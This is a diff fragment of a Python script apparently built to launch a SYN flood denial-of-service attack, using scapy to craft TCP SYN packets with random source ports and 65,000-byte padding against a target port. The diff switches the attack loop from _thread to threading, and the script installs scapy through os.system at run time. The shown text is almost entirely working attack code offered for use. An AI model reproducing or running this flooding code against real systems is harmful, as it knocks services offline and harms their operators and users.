@@ -9,7 +9,7 @@ from platform import platform
 from os import listdir
 os.system('pip3 install scapy')
 from scapy.all import *
-import _thread
+import threading
 
 
 
@@ -133,7 +133,7 @@ def DoS_synflood():
 
     tcp = TCP(sport=RandShort(), dport=int(target_port), flags="S")
 
-    # add some flooding data (1kb in this case)
+    # add some flooding data 
     raw = Raw(b"X"*65000)
 
     # stack up the layers
@@ -155,7 +155,11 @@ def DoS_synflood():
 
 os.system('pause')
 
-_thread.start_new_thread(DoS_synflood())
+#_thread.start_new_thread(DoS_synflood())
+
+
+threading.Thread(target=DoS_synflood()).start()
+
 
 
 input("Press Enter to exit:")
